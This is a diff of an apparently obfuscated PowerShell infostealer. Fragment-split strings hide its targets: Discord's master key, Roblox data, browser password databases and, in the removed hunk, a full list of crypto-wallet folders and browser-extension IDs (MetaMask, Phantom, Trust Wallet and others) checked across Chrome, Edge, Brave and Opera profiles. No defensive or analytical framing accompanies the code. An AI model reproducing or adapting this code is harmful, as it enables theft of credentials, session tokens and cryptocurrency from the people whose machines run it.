@@ -23,7 +23,6 @@ Remove-Item $f0 -EA SilentlyContinue
 $tD="D"+"ISCORD"
 $tR="R"+"OBLO"+"X"
 $tRM="R"+"OBLO"+"XMS"
-$tW="W"+"ALLET"
 $tP="P"+"ASSW"+"ORD"
 
 # Master key from Discord Local State
@@ -137,18 +136,6 @@ if(Test-Path $p3){
         break
     }
 }
-
-# Wallet detection
-$w0=@{("Ex"+"odus")="$env:APPDATA\Ex"+"odus";("At"+"omic")="$env:APPDATA\at"+"omic";("El"+"ectrum")="$env:APPDATA\El"+"ectrum";("Ja"+"xx")="$env:APPDATA\ja"+"xx";("Gu"+"arda")="$env:APPDATA\Gu"+"arda";("Co"+"inomi")="$env:APPDATA\Co"+"inomi";("Ar"+"mory")="$env:APPDATA\Ar"+"mory"}
-$w1=@{("Me"+"taMask")='nkbihfbeogaeaoehlefnkodbefgpgknn';("Ph"+"antom")='bfnaelmomeimhlpmgjnjophhpkkoljpa';("Ro"+"nin")='fnjhmkhhmkbjkkabndcnnogagogbneec';("Bi"+"nanceChain")='fhbohimaelbohpjbbldcngcnapndodjp';("Co"+"inbase")='hnfanknocfeofbddgcijnmhfnkdnaad';("Tr"+"ustWallet")='egjidjbpglichdcondbcbdnbeeppgdph';("Tr"+"onLink")='ibnejdfjmmkpcnlpebklmnkoeoihofec'}
-$br0=@(
-("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data"),
-("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data"),
-("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data"),
-("$env:APPDATA\Op"+"era S"+"oftware\Opera Stable")
-)
-foreach($n0 in $w0.Keys){if(Test-Path $w0[$n0]){Add-Content $f0 "$tW|$n0|desktop"}}
-foreach($n1 in $w1.Keys){foreach($b1 in $br0){$e3=Join-Path $b1 ("Def"+"ault\Lo"+"cal Ext"+"ension Set"+"tings\"+$w1[$n1]);if(Test-Path $e3){Add-Content $f0 "$tW|$n1|browser";break}}}
 
 # Browser password DBs
 $browsers=@(
